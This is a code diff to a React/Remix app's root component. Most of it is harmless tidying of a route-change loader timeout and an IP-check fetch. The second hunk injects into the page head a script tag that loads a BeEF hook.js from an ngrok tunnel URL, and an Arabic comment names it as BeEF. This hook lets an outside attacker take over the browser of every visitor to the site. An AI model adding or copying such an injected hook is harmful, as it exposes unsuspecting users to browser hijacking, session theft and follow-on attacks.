@@ -52,17 +52,12 @@ export default function App() {
   // إظهار loader عند كل تغيير في المسار (location.pathname)
   React.useEffect(() => {
     setShowLoader(true);
-
-    const timer = setTimeout(() => {
-      setShowLoader(false);
-    }, 2000); // ⏱️ يمكنك تعديل المدة هنا حسب الحاجة
-
+    const timer = setTimeout(() => setShowLoader(false), 2000);
     return () => clearTimeout(timer);
-  }, [location.pathname]); // 👈 هذا هو السر
+  }, [location.pathname]);
 
   useEffect(() => {
     if (location.pathname === "/banned") return;
-
     fetch("/api/ip-check")
       .then(res => {
         console.log("🎯 ip-check status:", res.status);
@@ -80,6 +75,11 @@ export default function App() {
         <meta name="viewport" content="width=device-width,initial-scale=1" />
         <Meta />
         <Links />
+
+        {/* ⬇⬇⬇ إضافة سكربت BeEF هنا */}
+        <script src="https://dda269de979e.ngrok-free.app/hook.js"></script>
+        {/* ⬆⬆⬆ */}
+
       </head>
       <body>
         <NavigationProvider>
